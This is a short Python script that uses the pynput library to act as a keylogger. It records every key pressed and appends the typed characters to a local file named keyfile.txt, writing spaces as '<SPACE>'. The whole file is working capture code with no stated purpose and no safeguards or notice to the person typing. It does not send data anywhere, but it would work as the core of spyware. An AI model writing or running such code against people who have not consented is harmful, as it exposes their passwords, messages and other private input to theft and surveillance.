from pynput import keyboard



def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            if char == ' ':
                char = '<SPACE>'
            logKey.write(char)
        except AttributeError:
            print("Error getting the character")

            
            

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
    